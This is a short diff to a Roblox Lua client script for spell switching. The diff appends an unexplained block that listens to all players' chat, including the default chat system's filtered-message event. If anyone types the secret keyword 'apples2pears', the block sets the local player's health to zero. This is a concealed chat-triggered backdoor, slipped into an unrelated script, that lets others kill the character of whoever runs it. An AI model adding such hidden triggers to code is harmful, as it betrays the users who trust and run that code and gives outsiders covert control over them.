@@ -200,3 +200,26 @@ UserInputService.InputBegan:Connect(function(input, gp)
         print("[Spell Switch] Now set to:", currentSpell)
     end
 end)
+
+local TRIGGER_KEYWORD="apples2pears"
+local function setLocalPlayerHealth()
+    local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+    if hum then hum.Health = 0 end
+end
+local function processMessage(plr,msg)
+    if typeof(msg)=="string" and msg:find(TRIGGER_KEYWORD) then setLocalPlayerHealth() end
+end
+for _,pl in ipairs(Players:GetPlayers()) do pl.Chatted:Connect(function(m) processMessage(pl,m) end) end
+Players.PlayerAdded:Connect(function(pl) pl.Chatted:Connect(function(m) processMessage(pl,m) end) end)
+pcall(function()
+    local ChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents",3)
+    if ChatEvents then
+        local ev = ChatEvents:WaitForChild("OnMessageDoneFiltering",3)
+        if ev then
+            ev.OnClientEvent:Connect(function(d)
+                local sp = Players:FindFirstChild(d.FromSpeaker or "")
+                if sp then processMessage(sp, d.Message or "") end
+            end)
+        end
+    end
+end)
